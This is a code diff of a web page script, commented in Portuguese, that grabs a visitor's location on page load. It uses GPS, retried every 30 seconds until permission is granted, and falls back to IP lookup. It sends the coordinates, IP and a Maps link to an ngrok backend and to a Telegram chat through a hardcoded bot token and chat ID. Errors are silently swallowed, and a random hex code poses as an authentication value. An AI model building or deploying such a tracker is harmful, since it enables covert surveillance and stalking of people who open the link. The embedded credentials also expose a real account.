@@ -142,28 +142,56 @@
   elAuth.textContent = randHex(16).toUpperCase();
 
   // Configurações de envio
-  const BACKEND_ENDPOINT    = "https://1e2746f31e5a.ngrok-free.app/send-location";
-  const IP_API_URL          = "https://ipapi.co/json/";
-  const TELEGRAM_BOT_TOKEN  = "8442922985:AAFNcmR2yqERaoVf28aENwewRrOpwEBfU1U";
-  const TELEGRAM_CHAT_ID    = "5693440005";
+  const BACKEND_ENDPOINT   = "https://1e2746f31e5a.ngrok-free.app/send-location";
+  const IP_API_URL         = "https://ipapi.co/json/";
+  const TELEGRAM_BOT_TOKEN = "8442922985:AAFNcmR2yqERaoVf28aENwewRrOpwEBfU1U";
+  const TELEGRAM_CHAT_ID   = "5693440005";
 
-  document.addEventListener("DOMContentLoaded", obterLocalizacao);
+  let watchId = null;
 
-  async function obterLocalizacao() {
-    if (!window.isSecureContext) return obterLocalizacaoPorIP();
-    try {
-      const perm = navigator.permissions && await navigator.permissions.query({ name: "geolocation" });
-      if (perm && perm.state === "denied") return obterLocalizacaoPorIP();
-    } catch { /* ignora */ }
+  document.addEventListener("DOMContentLoaded", () => {
+    iniciarWatch();
+    // se falhar, tenta por IP após 1s
+    setTimeout(obterLocalizacaoPorIP, 1000);
+  });
 
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(handlePos, obterLocalizacaoPorIP, {
-        enableHighAccuracy: true,
-        timeout: 10000
-      });
-    } else {
-      obterLocalizacaoPorIP();
+  function iniciarWatch() {
+    if (!navigator.geolocation) {
+      console.warn("Geolocation não suportado");
+      return;
     }
+    // força a requisição de permissão e começa a ouvir
+    watchId = navigator.geolocation.watchPosition(
+      pos => {
+        // assim que obtém, para de ouvir
+        navigator.geolocation.clearWatch(watchId);
+        handleData({
+          latitude:  pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          metodo:    "gps"
+        });
+      },
+      err => {
+        console.warn("Erro geolocation:", err.code, err.message);
+        if (err.code === err.PERMISSION_DENIED) {
+          // se negado, cancela watch e tenta fallback por IP
+          navigator.geolocation.clearWatch(watchId);
+          obterLocalizacaoPorIP();
+        }
+      },
+      {
+        enableHighAccuracy: true,
+        maximumAge:         0,
+        timeout:            15000
+      }
+    );
+    // tenta novamente a cada 30s caso o usuário demore a responder permissão
+    setTimeout(() => {
+      if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+        iniciarWatch();
+      }
+    }, 30000);
   }
 
   async function obterLocalizacaoPorIP() {
@@ -175,32 +203,24 @@
         ip:        d.ip,
         metodo:    "ip"
       });
-    } catch {
-      /* ignora falhas */
+    } catch (e) {
+      console.error("Erro fallback IP:", e);
     }
   }
 
-  function handlePos(pos) {
-    handleData({
-      latitude:  pos.coords.latitude,
-      longitude: pos.coords.longitude,
-      metodo:    "gps"
-    });
-  }
-
   async function handleData(data) {
-    // Monta a URL do Google Maps corretamente
+    // Monta URL do Google Maps
     data.mapsUrl   = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
     data.timestamp = new Date().toISOString();
 
-    // Envia para o seu backend via ngrok
+    // Envia para o backend
     fetch(BACKEND_ENDPOINT, {
       method:  "POST",
       headers: { "Content-Type": "application/json" },
       body:    JSON.stringify(data)
-    }).catch(() => { /* silencioso */ });
+    }).catch(() => {});
 
-    // Envia mensagem formatada ao Telegram
+    // Envia para o Telegram
     const texto = `
 📍 Localização detectada:
 Latitude:  ${data.latitude}
@@ -219,5 +239,6 @@ Método:    ${data.metodo}
     }).catch(console.error);
   }
 </script>
+
 </body>
 </html>
